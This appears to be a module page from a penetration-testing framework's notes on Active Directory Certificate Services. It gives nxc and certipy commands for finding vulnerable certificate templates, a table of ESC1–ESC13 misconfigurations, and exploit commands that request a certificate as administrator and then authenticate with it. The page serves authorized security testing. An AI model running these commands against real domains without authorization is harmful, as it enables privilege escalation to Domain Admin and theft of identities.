---
tags: [ade, module, adcs, certipy, certificates]
---

# adcs

> **Order:** 9 of 14  
> **Auth:** authenticated  
> **Prerequisites:** domain, fqdn, credentials  
> **Tools:** nxc, certipy

Enumerates Active Directory Certificate Services for misconfigurations.

## What It Does

### 1. ADCS Detection

```bash
nxc ldap <target> -u user -p pass -M adcs
```

Quick check for ADCS presence in the domain.

### 2. Certipy Vulnerability Scan

**NTLM:**
```bash
certipy find -u user -p pass -dc-ip <target> -vulnerable -stdout \
  -ldap-scheme ldap -output <output-dir>/certipy
```

**Kerberos:**
```bash
certipy find -target <fqdn> -u user@domain -p pass -k -dc-ip <target> \
  -vulnerable -stdout -ldap-scheme ldap -output <output-dir>/certipy
```

## What to Look For

| ESC | Name | Impact |
|-----|------|--------|
| ESC1 | Enrollee supplies subject | Request cert as any user (incl. Domain Admin) |
| ESC2 | Template with Any Purpose EKU | Subordinate CA certificate abuse |
| ESC3 | Enrollment Agent template | Certificate request agent escalation |
| ESC4 | Vulnerable ACL on template | Modify template to make it vulnerable |
| ESC6 | CA permits SAN specification | EDITF_ATTRIBUTESUBJECTALTNAME2 flag |
| ESC8 | ADCS web enrollment + NTLM relay | Relay authentication to HTTP endpoint |
| ESC13 | OID group linking | Abuse issuance policy for privilege escalation |

## Output

- `certipy_Certipy.txt` — plaintext findings
- `certipy_Certipy.json` — structured data
- `certipy_Certipy.zip` — for BloodHound CE ADCS integration

## Common Exploit Commands

```bash
# ESC1 — request cert as Domain Admin
certipy req -u user -p pass -dc-ip <target> \
  -ca <CA-NAME> -template <TEMPLATE> \
  -upn administrator@domain -target <fqdn>

# Authenticate with the stolen cert
certipy auth -pfx administrator.pfx -dc-ip <target>
```

## Related

- [[bloodyad]] — previous module
- [[smb-signing]] — next module (relay viability)
- [[Attack Paths#ADCS|ADCS Attack Paths]] — exploitation guide
- [[Modules]] — full module list
- [[ADE]] — back to hub
